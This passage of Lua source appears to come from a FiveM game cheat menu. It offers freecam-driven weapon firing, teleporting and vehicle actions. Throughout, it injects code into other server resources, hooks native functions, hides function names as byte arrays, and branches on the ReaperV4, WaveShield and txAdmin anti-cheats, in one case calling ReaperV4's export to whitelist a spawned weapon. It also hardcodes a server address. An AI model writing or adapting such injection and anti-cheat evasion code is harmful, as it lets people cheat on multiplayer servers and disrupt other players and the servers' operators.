            if IsControlJustReleased(0, 15) then -- Wheel Up
                FreecamHoveredIndex = (FreecamHoveredIndex - 2) % #FreecamOptions + 1
                MachoSendDuiMessage(DUI, json.encode({ action = "scroll", direction = "up" }))
            end

            if hoveredOption == "Shoot Weapon" then
                if IsDisabledControlJustPressed(0, 44) then -- Q
                    CurrentWeaponIndex = (CurrentWeaponIndex - 2) % #FreecamWeaponList + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateWeapon", index = CurrentWeaponIndex }))
                end
                if IsDisabledControlJustPressed(0, 38) then -- E
                    CurrentWeaponIndex = (CurrentWeaponIndex % #FreecamWeaponList) + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateWeapon", index = CurrentWeaponIndex }))
                end
            elseif hoveredOption == "Spawn Car" then
                if IsDisabledControlJustPressed(0, 44) then -- Q
                    CurrentVehicleIndex = (CurrentVehicleIndex - 2) % #FreecamVehicleList + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateVehicle", index = CurrentVehicleIndex }))
                end
                if IsDisabledControlJustPressed(0, 38) then -- E
                    CurrentVehicleIndex = (CurrentVehicleIndex % #FreecamVehicleList) + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateVehicle", index = CurrentVehicleIndex }))
                end
            end

            if IsDisabledControlPressed(0, 24) then
                local action = hoveredOption
                if action == "Shoot Weapon" then
                    local weapon = FreecamWeaponList[CurrentWeaponIndex]

                    if weapon == "WEAPON_PERMKILL" then
                        weapon = "WEAPON_TRANQUILIZER"
                    elseif weapon == "WEAPON_RPG_2" then
                        weapon = "WEAPON_AIRSTRIKE_ROCKET"
                    end

                    if weapon ~= LastWeaponFired then
                        LastWeaponFired = weapon

                        print(("weapon: %s, LastWeaponFired: %s"):format(weapon, LastWeaponFired))
                        
                        if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                            if GetResourceState("WaveShield") == "started" then
                                if _G.OSINTFreecamObject then
                                    local function RotationToDirection(rot)
                                        local z = math.rad(rot.z)
                                        local x = math.rad(rot.x)
                                        local num = math.abs(math.cos(x))
                                        return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                    end

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then
                                            return
                                        end

                                        _G[nativeName] = function(...)
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                    hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                    hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                    local camCoords = GetCamCoord(_G.OSINTFreecamObject)
                                    local camRot = GetCamRot(_G.OSINTFreecamObject, 2)
                                    local forward = RotationToDirection(camRot)
                                    local rayLength = 1000.0
                                    local targetPos = camCoords + forward * rayLength
                                    local playerPed = PlayerPedId()
                                    local weaponHash = GetHashKey(weapon)

                                    local function Encode(str)
                                        local t = {}
                                        for i = 1, #str do t[i] = string.byte(str, i) end
                                        return table.concat(t, ",")
                                    end

                                    local weaponBytes = Encode(weapon)

                                    Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("WaveShield") == "started" and "WaveShield" or "any", string.format([[
                                        if not _G.osintWeaponBypass then
                                            _G.osintWeaponBypass = { enabled = false }
                                        end
                                        _G.osintWeaponBypass.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetHashKey", function(orig, str) return orig(str) end)
                                        hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, ammo, false, true)
                                            else
                                                return orig(ped, hash, ammo, isHidden, equipNow)
                                            end
                                        end)
                                        hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, true)
                                            else
                                                return orig(ped, hash, equipNow)
                                            end
                                        end)

                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield WeaponBypass error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local ped = %d
                                            if _g(_b("DoesEntityExist"))(ped) then
                                                local weaponName = _d({%s})
                                                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                                if weaponHash and weaponHash ~= 0 then
                                                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                                end
                                            end
                                        end)

                                        print("Zawg")
                                    ]], playerPed, weaponBytes))

                                    -- MachoInjectThread(0, GetResourceState("monitor") and "monitor" or "any", "", [[
                                    --     function hNative(nativeName, newFunction)
                                    --         local originalNative = _G[nativeName]
                                    --         if not originalNative or type(originalNative) ~= "function" then
                                    --             return
                                    --         end

                                    --         _G[nativeName] = function(...)
                                    --             return newFunction(originalNative, ...)
                                    --         end
                                    --     end

                                    --     hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    --     hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                    --     hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                    --     hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                    --     hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                    --     hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                    --     hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                    --     local camCoords = ]] .. camCoords .. [[
                                    --     local targetPos = ]] .. targetPos .. [[
                                    --     local weaponHash = GetHashKey(]] .. weapon .. [[)

                                    --     GiveWeaponToPed(PlayerPedId(), weaponHash, 250, false, true)
                                    --     SetCurrentPedWeapon(PlayerPedId(), weaponHash, true)
                                    -- ]])

                                    Wait(350)

                                    ShootSingleBulletBetweenCoords(
                                        camCoords.x, camCoords.y, camCoords.z,
                                        targetPos.x, targetPos.y, targetPos.z,
                                        100,           -- damage
                                        true,          -- isAudible
                                        weaponHash,
                                        PlayerPedId(),
                                        true,          -- isInvisible
                                        false,         -- isCritical
                                        100000.0         -- speed
                                    )
                                end
                            else
                                MachoInjectResourceRaw(GetResourceState("monitor") == "started" and "monitor" or "any", [[
                                    if _G.OSINTFreecamObject then
                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        local camCoords = GetCamCoord(_G.OSINTFreecamObject)
                                        local camRot = GetCamRot(_G.OSINTFreecamObject, 2)
                                        local forward = RotationToDirection(camRot)
                                        local rayLength = 1000.0
                                        local targetPos = camCoords + forward * rayLength
                                        local playerPed = PlayerPedId()
                                        local weaponHash = GetHashKey("]] .. weapon .. [[")

                                        GiveWeaponToPed(PlayerPedId(), weaponHash, 13500, false, true)
                                        SetCurrentPedWeapon(PlayerPedId(), weaponHash, true)
                                        ShootSingleBulletBetweenCoords(
                                            camCoords.x, camCoords.y, camCoords.z,
                                            targetPos.x, targetPos.y, targetPos.z,
                                            100,           -- damage
                                            true,          -- isAudible
                                            weaponHash,
                                            playerPed,
                                            true,          -- isInvisible
                                            false,         -- isCritical
                                            100000.0         -- speed
                                        )
                                    end
                                ]])
                            end
                        else
                            if _G.OSINTFreecamObject then
                                local function RotationToDirection(rot)
                                    local z = math.rad(rot.z)
                                    local x = math.rad(rot.x)
                                    local num = math.abs(math.cos(x))
                                    return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                end

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)

                                local camCoords = GetCamCoord(_G.OSINTFreecamObject)
                                local camRot = GetCamRot(_G.OSINTFreecamObject, 2)
                                local forward = RotationToDirection(camRot)
                                local rayLength = 1000.0
                                local targetPos = camCoords + forward * rayLength
                                local playerPed = PlayerPedId()
                                local weaponHash = GetHashKey(weapon)

                                GiveWeaponToPed(playerPed, weaponHash, 255, false, true)
                                MachoInjectThread(0, "ReaperV4", "", [[
                                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:" .. ]] .. weaponHash .. [[, true, true)
                                    if success then
                                        print("Updated Cache Successfully")
                                    else
                                        print("Failed to Update Cache")
                                    end
                                ]])
                                Wait(250)
                                ShootSingleBulletBetweenCoords(
                                    camCoords.x, camCoords.y, camCoords.z,
                                    targetPos.x, targetPos.y, targetPos.z,
                                    100,           -- damage
                                    true,          -- isAudible
                                    weaponHash,
                                    playerPed,
                                    true,          -- isInvisible
                                    false,         -- isCritical
                                    100000.0         -- speed
                                )
                            end
                        end
                    else
                        if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                            if GetResourceState("WaveShield") == "started" then
                                if _G.OSINTFreecamObject then
                                    print("Toogie Doogie")

                                    local function RotationToDirection(rot)
                                        local z = math.rad(rot.z)
                                        local x = math.rad(rot.x)
                                        local num = math.abs(math.cos(x))
                                        return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                    end

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then
                                            return
                                        end

                                        _G[nativeName] = function(...)
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                    hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                    hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                    local camCoords = GetCamCoord(_G.OSINTFreecamObject)
                                    local camRot = GetCamRot(_G.OSINTFreecamObject, 2)
                                    local forward = RotationToDirection(camRot)
                                    local rayLength = 1000.0
                                    local targetPos = camCoords + forward * rayLength
                                    local playerPed = PlayerPedId()
                                    local weaponHash = GetHashKey(weapon)

                                    local function Encode(str)
                                        local t = {}
                                        for i = 1, #str do t[i] = string.byte(str, i) end
                                        return table.concat(t, ",")
                                    end

                                    local weaponBytes = Encode(weapon)

                                    Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("WaveShield") == "started" and "WaveShield" or "any", string.format([[
                                        if not _G.osintWeaponBypass then
                                            _G.osintWeaponBypass = { enabled = false }
                                        end
                                        _G.osintWeaponBypass.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetHashKey", function(orig, str) return orig(str) end)
                                        hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, ammo, false, true)
                                            else
                                                return orig(ped, hash, ammo, isHidden, equipNow)
                                            end
                                        end)
                                        hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, true)
                                            else
                                                return orig(ped, hash, equipNow)
                                            end
                                        end)

                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield WeaponBypass error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local ped = %d
                                            if _g(_b("DoesEntityExist"))(ped) then
                                                local weaponName = _d({%s})
                                                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                                if weaponHash and weaponHash ~= 0 then
                                                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                                end
                                            end
                                        end)

                                        print("Zawg")
                                    ]], playerPed, weaponBytes))

                                    Wait(150)

                                    ShootSingleBulletBetweenCoords(
                                        camCoords.x, camCoords.y, camCoords.z,
                                        targetPos.x, targetPos.y, targetPos.z,
                                        100,           -- damage
                                        true,          -- isAudible
                                        weaponHash,
                                        playerPed,
                                        true,          -- isInvisible
                                        false,         -- isCritical
                                        100000.0         -- speed
                                    )
                                end
                            else
                                MachoInjectResourceRaw(GetResourceState("monitor") == "started" and "monitor" or "any", [[
                                    if _G.OSINTFreecamObject then
                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        local camCoords = GetCamCoord(_G.OSINTFreecamObject)
                                        local camRot = GetCamRot(_G.OSINTFreecamObject, 2)
                                        local forward = RotationToDirection(camRot)
                                        local rayLength = 1000.0
                                        local targetPos = camCoords + forward * rayLength
                                        local playerPed = PlayerPedId()
                                        local weaponHash = GetHashKey("]] .. weapon .. [[")

                                        ShootSingleBulletBetweenCoords(
                                            camCoords.x, camCoords.y, camCoords.z,
                                            targetPos.x, targetPos.y, targetPos.z,
                                            100,           -- damage
                                            true,          -- isAudible
                                            weaponHash,
                                            playerPed,
                                            true,          -- isInvisible
                                            false,         -- isCritical
                                            100000.0         -- speed
                                        )
                                    end
                                ]])
                            end
                        else
                            if _G.OSINTFreecamObject then
                                local function RotationToDirection(rot)
                                    local z = math.rad(rot.z)
                                    local x = math.rad(rot.x)
                                    local num = math.abs(math.cos(x))
                                    return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                end

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)

                                local camCoords = GetCamCoord(_G.OSINTFreecamObject)
                                local camRot = GetCamRot(_G.OSINTFreecamObject, 2)
                                local forward = RotationToDirection(camRot)
                                local rayLength = 1000.0
                                local targetPos = camCoords + forward * rayLength
                                local playerPed = PlayerPedId()
                                local weaponHash = GetHashKey(weapon)

                                GiveWeaponToPed(PlayerPedId(), weaponHash, 250, false, true)
                                SetCurrentPedWeapon(PlayerPedId(), weaponHash, true)
                                ShootSingleBulletBetweenCoords(
                                    camCoords.x, camCoords.y, camCoords.z,
                                    targetPos.x, targetPos.y, targetPos.z,
                                    100,           -- damage
                                    true,          -- isAudible
                                    weaponHash,
                                    playerPed,
                                    true,          -- isInvisible
                                    false,         -- isCritical
                                    100000.0         -- speed
                                )
                            end
                        end
                    end
                end
            end

            -- Left Click
            if IsDisabledControlJustPressed(0, 24) then
                local action = hoveredOption
                if action == "Teleport" then
                    if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                        if GetResourceState("WaveShield") == "started" then
                            if _G.OSINTFreecamObject then
                                local function RotationToDirection(rot)
                                    local z = math.rad(rot.z)
                                    local x = math.rad(rot.x)
                                    local num = math.abs(math.cos(x))
                                    return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                end

                                function GetEmptySeat(vehicle)
                                    local seats = {
                                        -1, 0, 1, 2
                                    }

                                    for _, seat in ipairs(seats) do
                                        if IsVehicleSeatFree(vehicle, seat) then
                                            return seat
                                        end
                                    end

                                    return -1
                                end

                                local camCoords = GetCamCoord(_G.OSINTFreecamObject)
                                local rot = GetCamRot(_G.OSINTFreecamObject, 2)
                                local forward = RotationToDirection(rot)
                                local rayLength = 1000.0
                                local targetPos = camCoords + forward * rayLength
                                local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, PlayerPedId(), 0)
                                local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit
                                        local playerPed = PlayerPedId()
                                        local seat = GetEmptySeat(vehicle)
                                        if seat == -1 then
                                            TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                        elseif seat >= 0 then
                                            TaskWarpPedIntoVehicle(playerPed, vehicle, seat)
                                        else
                                            print("[^5SYNC^7]: There aren't any seats available in this vehicle.")
                                        end
                                    else
                                        SetEntityCoords(PlayerPedId(), endCoords.x, endCoords.y, endCoords.z, false, false, false, false)
                                    end
                                else
                                    print("[^5SYNC^7]: There aren't any valid locations to teleport to.")
                                end
                            end
                        else
                            MachoInjectResourceRaw(GetResourceState("monitor") == "started" and "monitor" or "any", [[
                                if _G.OSINTFreecamObject then
                                    local function RotationToDirection(rot)
                                        local z = math.rad(rot.z)
                                        local x = math.rad(rot.x)
                                        local num = math.abs(math.cos(x))
                                        return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                    end

                                    function GetEmptySeat(vehicle)
                                        local seats = {
                                            -1, 0, 1, 2
                                        }

                                        for _, seat in ipairs(seats) do
                                            if IsVehicleSeatFree(vehicle, seat) then
                                                return seat
                                            end
                                        end

                                        return -1
                                    end

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then
                                            return
                                        end

                                        _G[nativeName] = function(...)
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEmptySeat", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                    hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoordsWithoutPlantsReset", function(originalFn, ...) return originalFn(...) end)

                                    local camCoords = GetCamCoord(_G.OSINTFreecamObject)
                                    local rot = GetCamRot(_G.OSINTFreecamObject, 2)
                                    local forward = RotationToDirection(rot)
                                    local rayLength = 1000.0
                                    local targetPos = camCoords + forward * rayLength
                                    local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, PlayerPedId(), 0)
                                    local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                                    if hit then
                                        if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                            local vehicle = entityHit
                                            local playerPed = PlayerPedId()
                                            local seat = GetEmptySeat(vehicle)
                                            if seat == -1 then
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                            elseif seat >= 0 then
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, seat)
                                            else
                                                print("[^5OSINT^7]: There aren't any seats available in this vehicle.")
                                            end
                                        else
                                            SetEntityCoordsWithoutPlantsReset(PlayerPedId(), endCoords.x, endCoords.y, endCoords.z, false, false, false, false)
                                        end
                                    else
                                        print("[^5OSINT^7]: There aren't any valid locations to teleport to.")
                                    end
                                end
                            ]])
                        end
                    else
                        if _G.OSINTFreecamObject then
                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = {
                                    -1, 0, 1, 2
                                }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local camCoords = GetCamCoord(_G.OSINTFreecamObject)
                            local rot = GetCamRot(_G.OSINTFreecamObject, 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0

                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, PlayerPedId(), 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            if hit then
                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                    local vehicle = entityHit
                                    local playerPed = PlayerPedId()
                                    local seat = GetEmptySeat(vehicle)
                                    if seat == -1 then
                                        TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                    elseif seat >= 0 then
                                        TaskWarpPedIntoVehicle(playerPed, vehicle, seat)
                                    else
                                        print("[^5OSINT^7]: There aren't any seats available in this vehicle.")
                                    end
                                else
                                    MachoInjectThread(0, "any", "", [[ 
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                                        hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                        hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                                        hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                                        hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                                        hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        SetEntityCoords(PlayerPedId(), ]] .. endCoords.x .. [[, ]] .. endCoords.y .. [[, ]] .. endCoords.z .. [[, false, false, false, false)
                                    ]])
                                end
                            else
                                print("[^5OSINT^7]: There aren't any valid locations to teleport to.")
                            end
                        end
                    end
                elseif action == "Kick from Vehicle" then
                    if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                            local targetRes = (GetResourceState("lb-phone") == "started" and "lb-phone")
                                or (GetResourceState("WaveShield") == "started" and "WaveShield")
                                or "any"

